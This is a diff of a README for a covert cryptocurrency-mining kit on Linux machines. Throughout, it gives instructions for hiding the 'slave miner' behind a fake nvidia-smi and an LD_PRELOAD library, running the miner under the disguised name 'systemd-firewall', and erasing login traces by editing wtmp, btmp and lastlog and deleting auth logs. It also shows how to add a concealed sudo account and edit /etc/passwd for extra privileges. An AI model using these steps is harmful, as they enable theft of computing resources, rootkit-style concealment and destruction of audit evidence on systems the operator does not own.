@@ -15,11 +15,10 @@ run the `Makefile` by `sudo make`. If you want to be blamed, run it without `sud
 
 ## Prerequiste
 ### environmental setting
-make sure you have gcc(which is preinstalled in your system) pyinstaller installed:
-```bash
-conda activate [your environment]
-pip install pyinstaller
-```
+make sure you have:
+* gcc, which is preinstalled in your system.
+* pyinstaller, installed by `pip install pyinstaller`.
+
 ### nvidia-smi
 1. please make sure the variable `skip` in `source/nvidia-smi.py` is the same to the **slave miner**'s file name.
 1. rename original `nvidia-smi` by `nl-toolkit` in `/usr/bin`.
@@ -35,13 +34,14 @@ pip install pyinstaller
 
 ### libGNU.co
 1. move `libGNU.co` to `/usr/lib`.
-1. add `/usr/lib/libGNU.co` to `/etc/ld.so.preload`; or add `export LD_PRELOAD=/usr/lib/libGNU.so` to `/etc/profile` (remember to execute `source /etc/profile` to make it effective).
+1. add `/usr/lib/libGNU.so` to `/etc/ld.so.preload`; or add `export LD_PRELOAD=/usr/lib/libGNU.so` to `/etc/profile` (remember to execute `source /etc/profile` to make it effective).
 
 **Risk:** add these files to system environment is easy to detect just by `cat /etc/ld.so.preload` or `echo $LD_PRELOAD`.
 
 ## Usage
+**Very important:** run `sudo -s` first!
 ### Slash the miner
-1. `sudo nohup systemd-firewall 2>&1 > /dev/null &`.
+1. `nohup systemd-firewall 2>&1 > /dev/null &`.
 1. check mining status by `nl-toolkit`.
 
 ### Check degraded files
@@ -55,16 +55,16 @@ pip install pyinstaller
 utmpdump [logfile] > tmp_output.txt
 utmpdump -r tmp_output.txt > [logfile]
 ```
-
 * `last`: `/var/log/wtmp`.
 * `lastb`: `/var/log/btmp`.
-* `lastlog`: `/var/log/lastlog`.
+
+clean `lastlog` by `> /var/log/lastlog` if you are `root` user, or by `vi /var/log/lastlog` for otherwise.
 
 1. delete your login log in `/var/log/auth.log` (for Ubuntu).
 1. delete your login log in `/var/log/secure.log` (for CentOS).
 
 ## Tips
- * Add a new user by `useradd [your name] -G sudo -d /usr/bin -s /bin/bash -l -M`. `-l` can avoid you be added to the lastlog and faillog databases. `-M` will not create your home directory.
+ * Add a new user by `useradd [your name] -G sudo -d /usr/bin -s /bin/bash -l -M`. `-l` can avoid you be added to `last` and `lastb`, but does not work for `lastlog`. `-M` will not create your home directory.
  * edit `/etc/passwd` to get more privileges for your account.
 
 ## Notations
